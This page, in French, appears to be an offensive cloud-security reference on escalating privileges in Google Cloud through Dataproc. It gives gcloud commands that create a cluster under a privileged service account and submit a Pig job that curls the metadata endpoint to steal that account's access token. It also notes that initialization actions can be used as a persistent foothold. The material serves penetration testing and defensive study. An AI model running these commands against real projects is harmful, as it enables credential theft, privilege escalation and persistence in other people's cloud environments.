---
title: "Dataproc : actAs sur un compte de service via un cluster ou une tâche"
description: "Créer un cluster Dataproc ou soumettre une tâche qui s'exécute en tant que compte de service du cluster via actAs."
keywords:
  - Dataproc
  - cluster
  - tâche
  - actAs
  - compte de service
---

# Dataproc

Les clusters Dataproc exécutent des instances managées de Spark et Hadoop, et les VM du cluster s'exécutent en tant que **compte de service**. Avec `dataproc.clusters.create` (plus `iam.serviceAccounts.actAs` sur un compte de service privilégié), vous construisez un cluster lié à ce compte, puis soumettez une tâche qui lit son jeton ou agit en son nom.

## Créer un cluster avec un compte de service choisi

```bash
gcloud dataproc clusters create c1 --region us-central1 \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com

# submit a job that exfiltrates the cluster SA token
gcloud dataproc jobs submit pig --cluster c1 --region us-central1 \
  --execute "sh curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Notes d'exploitation

- Les nœuds du cluster exposent le point de terminaison de métadonnées, de sorte que toute tâche capable d'exécuter un shell lit les identifiants du compte de service attaché.
- Le compte de service Dataproc par défaut est le compte de service Compute Engine par défaut (Editor) sauf s'il est remplacé, une escalade étendue.
- Une action d'initialisation sur le cluster est un point d'ancrage de persistance durable qui s'exécute à chaque démarrage de nœud.

## Outils

- **gcloud** (`dataproc clusters create`, `dataproc jobs submit`).

## Références

- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud : escalade de privilèges GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google : comptes de service Dataproc](https://cloud.google.com/dataproc/docs/concepts/configuring-clusters/service-accounts)
